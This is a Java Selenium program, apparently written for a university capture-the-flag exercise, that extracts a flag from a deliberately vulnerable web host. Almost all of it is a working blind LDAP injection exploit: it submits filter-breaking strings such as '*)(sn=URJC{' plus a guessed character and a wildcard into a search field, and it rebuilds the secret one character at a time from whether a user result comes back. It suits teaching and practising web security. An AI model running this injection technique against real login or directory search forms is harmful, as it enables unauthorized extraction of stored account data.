package es.urjc.etsii.metodologias.selenium;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;

import java.util.ArrayList;
import java.util.List;

public class Java_Directorio {
    public static void main(String[] args) throws InterruptedException {
        var driver = createWebDriver();
        // Visitamos la URL en el navegador
        driver.get("https://r3-ctf-vulnerable.numa.host/");

        // Sabemos que el inicio de la flag es ""URJC{""
        String flag = "*)(sn=URJC{";
        boolean finalFlag = false;

        while (!finalFlag){
            // Suponemos que la flag contendra caracteres ascii del 122-42 ya que con el '*' saldra correcto
            int codigoAscii = 122;
            boolean found = false;
            while (codigoAscii > 41 && !found){
                List<WebElement> lista = new ArrayList<>();
                String tryFlag = flag + (char)codigoAscii + '*';
                WebElement searchBox = driver.findElement(By.id("name"));
                searchBox.clear();
                searchBox.sendKeys(tryFlag);
                searchBox.submit();

                // Si devuelve un resultado, es el siguiente caracter de la flag
                try {
                    WebElement user = driver.findElement(By.className("user"));
                    lista.add(user);
                    if (!lista.isEmpty()){
                        found = true;
                        flag += (char)codigoAscii;
                        // Si lo recorremos entero y encontramos '*' es que hemos terminado
                        if (codigoAscii == 42){
                            finalFlag = true;
                        }
                    }
                } catch (Exception e) {
                    // Elemento no encontrado, no hacemos nada
                }
                // Sino probamos otro caracter
                codigoAscii--;

            }
        }
        // Cerramos el driver
        driver.quit();

        // Imprimimos la flag final correcta
        flag = flag.substring(6, flag.length() - 1);  // quitamos el inicio y el ultimo caracter (*)
        flag += '}';  // ponemos '}' al final
        System.out.println(flag);
    }

    public static WebDriver createWebDriver(){
        // Path al driver
        System.setProperty("webdriver.chrome.driver","Practica3_CTF/src/main/resources/chromedriver.exe");
        return new ChromeDriver();
    }
}
